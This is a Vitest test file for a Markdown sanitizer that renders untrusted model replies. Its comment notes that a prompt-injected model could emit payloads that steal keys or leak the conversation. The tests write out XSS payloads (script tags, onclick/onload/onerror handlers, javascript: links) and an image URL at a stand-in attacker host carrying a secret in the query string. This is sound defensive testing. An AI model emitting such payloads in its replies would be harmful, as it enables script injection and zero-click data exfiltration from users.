// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

// Replies are untrusted: a prompt-injected model can emit anything. These are
// the payloads that would steal the key or leak the conversation if rendered raw.
describe('renderMarkdown', () => {
  it('renders ordinary Markdown', () => {
    const html = renderMarkdown('**bold** and `code`\n\n- one\n- two')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<li>one</li>')
  })

  it('strips script and event handlers', () => {
    const html = renderMarkdown('hi <script>alert(1)</script><a href="#" onclick="steal()">x</a> <svg onload="steal()"></svg>')
    expect(html).not.toMatch(/<script|onclick|onload/i)
  })

  it('removes images, so a reply cannot leak data by loading a URL with no click', () => {
    const html = renderMarkdown('![x](https://attacker.example/?q=secret) <img src="https://attacker.example/p.png" onerror="steal()">')
    expect(html).not.toMatch(/<img|attacker\.example\/p\.png|onerror/i)
  })

  it('neutralizes javascript: links and opens real links in a new tab without opener access', () => {
    expect(renderMarkdown('[click](javascript:steal())')).not.toMatch(/javascript:/i)
    const html = renderMarkdown('[docs](https://openrouter.ai/docs)')
    expect(html).toContain('href="https://openrouter.ai/docs"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
})
